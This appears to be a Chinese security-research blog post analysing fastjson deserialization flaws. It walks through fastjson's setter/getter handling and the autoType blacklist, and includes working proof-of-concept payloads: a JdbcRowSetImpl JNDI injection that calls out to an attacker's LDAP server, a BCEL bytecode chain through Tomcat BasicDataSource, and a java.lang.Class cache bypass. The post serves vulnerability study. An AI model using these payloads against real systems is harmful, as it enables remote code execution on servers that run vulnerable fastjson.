---
title: "fastjson JNDI+不出网BCEL"
onlyTitle: true
date: 2024-10-8 22:53:23
categories:
- java
- 框架漏洞
tags:
- fastjson
- BCEL
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8104.png
---

回想fastjson获取setter方法的部分

```java
for (Method method : methods) { //
    int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
    String methodName = method.getName();
    if (methodName.length() < 4) {
        continue;
    }

    if (Modifier.isStatic(method.getModifiers())) {
        continue;
    }

    //...
    if (!methodName.startsWith("set")) { // TODO "set"的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
        continue;
    }

    char c3 = methodName.charAt(3);

    String propertyName;
    if (Character.isUpperCase(c3) //
        || c3 > 512 // for unicode method name
    ) {
        if (TypeUtils.compatibleWithJavaBean) {
            propertyName = TypeUtils.decapitalize(methodName.substring(3));
        } else {
            propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
        }
    } else if (c3 == '_') {
        propertyName = methodName.substring(4);
    } else if (c3 == 'f') {
        propertyName = methodName.substring(3);
    } else if (methodName.length() >= 5 && Character.isUpperCase(methodName.charAt(4))) {
        propertyName = TypeUtils.decapitalize(methodName.substring(3));
    } else {
        continue;
    }

    Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
    if (field == null && types[0] == boolean.class) {
        String isFieldName = "is" + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
        field = TypeUtils.getField(clazz, isFieldName, declaredFields);
    }

	//...

    add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
                                 annotation, fieldAnnotation, null));
}
```

循环遍历每个方法，看是否存在符合setter的方法：

满足set开头，参数长度为1，非static，方法名总长度大于3

然后，把set后第一个字母小写，并取后面的字符串为属性名。也就是说不是按照属性名->取setter的逻辑来的。**没有对应的属性名，也能取到setter**。getter同理

上一节的结论：

>fastjson根据@type还原类，是在本地从0开始实例化，然后调用setter赋值
>
>如果解析函数里有JSON.toJSON，还会调用getter
>
>按以下顺序判断，满足条件的话，会被当成setter调用：
>
>* set开头，参数长度为1，非static，方法名总长度大于3
>* 没有setter方法，有字段是bool类型，则用`is`加上首字母大写后的字段去查找（所以isName这种也算setter）
>* 没有setter方法，有getter方法，参数长度为0，返回类型是属于Collection 或其子类、Map 或其子类、AtomicBoolean、AtomicInteger、AtomicLong的一种

由于fastjson是根据参数在本地从0创建类，所以传输的类不需要实现Serializable接口，字段有transient也无所谓

理所应当的想到TemplatesImpl#getOutputProperty组成Gadget。但是由于是在本地创建，setter赋值，而不是我们直接传输赋好值的对象，所以反射修改字段的payload一概用不了。



# fastjson<=1.2.24

ok，下面直接给链吧

## JdbcRowSetImpl JNDI

需要在JNDI影响版本下。目标出网（能外联）

漏洞点：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155134171.png)

用setter触发：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155652491.png)

getter因为不满足上面的条件，在无JSON.toJSON解析的情况下用不了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006155716945.png)

利用链：

```xml
JdbcRowSetImpl.setAutoCommit->
JdbcRowSetImpl.connect
```

yakit / marshelsec / misc.LdapAtkServer都能开LDAP打JNDI

yakit -> 反连服务器 -> payload配置

```java
public static void main(String[] args) throws Exception {
    String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://172.25.0.1:8085/aRWBgUym\",\"autoCommit\":0}";
    JSON.parse(payload);
}
```



## BCEL字节码

据野史记载，在 JDK < 8u251 rt.jar都集成了BCEL ClassLoader，在下面这个包

```
com.sun.org.apache.bcel.internal.util
```

同时在Tomcat中也会存在相关的依赖

* tomcat7：org.apache.tomcat.dbcp.dbcp.BasicDataSource

* tomcat8及其以后：org.apache.tomcat.dbcp.dbcp2.BasicDataSource

随便找了个依赖

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>7.0.65</version>
</dependency>
```

该类下的loadClass方法如下：如果类以`$$BCEL$$`开头，会调用createClass生成字节码，并用defineClass加载字节码

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006162851917.png)

creatClass里用Utility.decode解密class_name第8位后的内容

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006163322368.png)

Utility.decode对应了Utility.encode()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006163445870.png)

so，传入`$$BCEL$$`+Utility.decode(payload)经过loadClass即可RCE

那怎么调用到loadClass呢？BasicDataSource的forName触发双亲委派，指定driverClassLoader就OK。

![](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006182351359.png)

刚好有对应的setter去给这堆变量赋值：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006182634501.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006182743233.png)

可惜向上只能get方法触发createDataSource。只能parseObject能利用（setLogWriter没办法从json传值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006191242263.png)

```java
public static void main(String[] args) throws Exception {
    byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class"));
    String bcel = "\""+"$$BCEL$$"+Utility.encode(code,true)+"\"";
    //payload = {
    //              "@type":"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
    //              "driverClassLoader":{
    //                  "@type":"com.sun.org.apache.bcel.internal.util.ClassLoader",
    //              },
    //              "driverClassName":bcel}
    //          }
    String payload = "{" +
            "\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"," +
            "\"driverClassLoader\":{" +
            "\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"" +
            "}," +
            "\"driverClassName\":" + bcel +
            "}";
    System.out.println(payload);
    JSON.parseObject(payload);
}
```



wait，好像还有操作

### MapSerializer -> ASMSerializer

parse必会走到`DefaultJSONParser.parseObject(final Map object,Object fieldName)`，其中必走到这个if判断，且必走进去

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006221446313.png)

因为Object本来就是JSONObject

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006221717638.png)

JSONObject的父类是JSON，调用JSONObject.toString会走到JSON.toString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006224404531.png)

来看JSON.toString，转到JSON.toJSONString

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241006214827585.png)

跟进这个JSONSerializer.write

有没有很像JSON.toJSON？一样的流程

但是并没有走进创建ASM字节码的分支，而是由于我们传入JSONObject继承自Map，所以使用了MapSerializer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007143851229.png)

调用write方法就走进了MapSerializer.write

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144328539.png)

里面循环解析JSONObject的键值对，而且取出了value，如果这里value是BasicDataSource的话，就会类似JSON.toJSON那样，创建ASM字节码并调用getter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144544248.png)

> 创建ASM字节码并调用getter请见字节码提取的fastjson流程分析：
>
> https://godownio.github.io/2024/10/06/fastjson-liu-cheng-fen-xi-bu-han-poc/#toJSON%E8%A7%A6%E5%8F%91getter

跟进到getObjectWriter也可以确证

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007144755985.png)

所以用JSONObject嵌套一个键为JSONObject的json，这个键再嵌套一个值为BasicDataSource的json，即可调用BasicDataSource.getConnection

就能和getConntect连起来了



> 这里我调试发现，是以栈的形式触发toString，从里到外，也就是说先BasicDataSource.toString，再JSONObject.toString。虽然并不重要

利用链：

```xml
JSON.parse ->
DefaultJSONParser.parseObject ->
JSONObject.toString -> toJSONString
MapSerializer.write ->
ASMSerializer_1_xxx字节码.write ->
BasicDataSource.getConnect ->
BasicDataSource.createDataSource ->
BasicDataSource.createConnectionFactory ->
com.sun.org.apache.bcel.internal.utilClassLoader.loadClass
```

```json
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```



test POC：

```java
public class BCEL_getConnect {
    public static void main(String[] args) throws Exception {
        //{
        //    {
        //        "x":{
        //                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
        //                "driverClassLoader": {
        //                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
        //                },
        //                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        //        }
        //    }: "x"
        //}
        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class"));
        String bcel = "\""+"$$BCEL$$"+ Utility.encode(code,true)+"\"";
        String poc = "{\n" +
                    "    {\n" +
                    "        \"aaa\": {\n" +
                    "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                    "                \"driverClassLoader\": {\n" +
                    "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                    "                },\n" +
                    "                \"driverClassName\": "+ bcel+ "\n" +
                    "        }\n" +
                    "    }: \"bbb\"\n" +
                    "}";
        System.out.println(poc);
        JSON.parse(poc);
    }
}
```

能打目标不出网，直接执行字节码，搭配Servlet进行回显，或者写ssh？

但是需要目标有Tomcat依赖



# fastjson 1.2.25-1.2.47

## 修复

1.2.24最终调用到的DefaultJSONParser.parseObject，以TypeUtils.loadClass加载类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241007161107312.png)

1.2.25开始，改用checkAutoType加载类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008152248617.png)

这个方法里搞了个黑名单：

```java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

以及一个白名单，由开发者自行添加，默认为空。判断逻辑如下：

* 如果autoTypeSupport开启，则先遍历白名单，如果在其中，则直接加载类，否则遍历黑名单，如果在其中则抛异常（autoTypeSupport默认为false）
* getClassFormMapping从缓存中获取反序列化器， 并从反序列化器中加载类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008160408520.png)
* 如果autoTypeSupport == false，则先遍历黑名单，如果在则抛出异常，然后遍历白名单，如果在则直接加载

* 最后如果上面两个都没加载到类，并且autoTypeSupport开启，则调用原来的TypeUtils.loadClass加载类。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008155838490.png)

网上说的前面加`L`后面加`;`的绕过方式，适用于autoTypeSupport开启的情况，但实际上根本没这种环境，有没有更通用的办法呢？

## MiscCodec

唯一的入口就是getClassFromMapping，直接给解法：

在ParserConfig初始化的时候，向里面put了一堆key为class，value为反序列化构造器的Entry

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008171713109.png)

如果传入的typeName是Class.class，则获取的反序列化构造器为MiscCodec，并按正常流程，调用deserialze对吧

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172534594.png)

在deserialze方法时，MiscCodec.deserialze会进入下面这个if，如果strVal为我们传进去的恶意类，比如ldap用的`com.sun.rowset.JdbcRowSetImpl`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172141862.png)

会把结果put进mappings

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172732991.png)

之后再走到checkAutoType加载BasicDataSource时，用getClassFromMapping看直接有没有加载过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172804551.png)

于是返回了加载过的恶意类结果

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008172904352.png)

怎么设置strVal呢？strVal来自objVal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008173126844.png)

objVal来自parser.parse()，如果下一个字符串是"val"，则用lexer.nextToken()移动到下一个标记，调用parser.accept确保当前符号为冒号，parser.parse()解析实际的对象值，赋给objVal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008184519145.png)

利用`"val":"com.sun.rowset.JdbcRowSetImpl"`即可把objVal设置为Val



完成绕过

JSON字符串：

```json
{
    {
    	"@type" : "java.lang.Class",
    	"val" : "com.sun.rowset.JdbcRowSetImpl"
	},
    {
    	"@type" : "com.sun.rowset.JdbcRowSetImpl",
    	"dataSourceName" : "ldap:your-ldapServer",
    	"autoCommit" : true
	}
}
```



JDNI POC：

```java
public class JdbcRowSetImpl_1_2_41 {
    public static void main(String[] args) throws Exception {
        String payload = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://172.22.112.1:8085/YAxwlVoO\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
```



同理，改造的BCEL能用吗：

```java
public class BCEL_parse_1_2_47 {
    public static void main(String[] args) throws Exception
    {
        byte[] code = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\Runtime_static.class"));
        String bcel = "\""+"$$BCEL$$"+ Utility.encode(code,true)+"\"";
        String payload = "{{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\"}," +
                "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}," +
                "{\n" +
                "    {\n" +
                "        \"aaa\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": "+ bcel+ "\n" +
                "        }\n" +
                "    }: \"bbb\"\n" +
                "}}";
        JSON.parse(payload);
    }
}
```



这个版本不出网用不了BCEL，因为BasicDataSource嵌套了ClassLoader利用，而且不能传两个java.lang.Class，分析如下：

快进到看mappings，可以看到两个都put进Mappings了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008193606175.png)

在加载ClassLoader类时，由于expectClass经过了第一次被置为Class类，第二次就取到了exceptClass

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194307899.png)

于是checTypeSupport里，走进了第一个if，ClassLoader在黑名单，于是直接G

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241008194203623.png)



1.2.24能打JNDI和不出网BCEL，1.2.25-1.2.47只能打出网的JNDI

BCEL打内存马=修改本地组件功能，通过达到不出网利用且回显的手法

网上流传的1.2.25+版本打BCEL都是骗子，我鉴定过了，一个腾讯云的一个freebuf的，自己都跑不通还来骗

高版本利用：https://www.freebuf.com/vuls/361576.html

以后学了groovy再看
